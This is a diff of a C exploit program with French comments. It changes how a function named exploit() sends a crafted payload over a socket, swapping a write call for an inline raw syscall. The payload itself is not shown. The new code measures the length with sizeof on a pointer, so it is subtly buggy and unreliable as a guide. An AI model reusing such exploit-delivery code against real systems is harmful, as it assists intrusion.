@@ -178,7 +178,16 @@ void exploit(int connfd){
 	printf("\nNombre d'octets = %d\n", i+1);
 
 	char* payload = crafted_payload(buff);
-	my_write(connfd, payload, strlen(payload)); // A CHANGER EN ASM BIEN SÛR !!!
+	//my_write(connfd, payload, strlen(payload));
+	ssize_t ret;
+    asm volatile
+    (
+        "syscall"
+        : "=a" (ret)
+        //                 EDI      RSI       RDX
+        : "0"(__NR_write), "D"(connfd), "S"(payload), "d"(sizeof(payload))
+        : "rcx", "r11", "memory"
+    );
 
 	printf("%s\n", payload);
 	printf("OK\n");
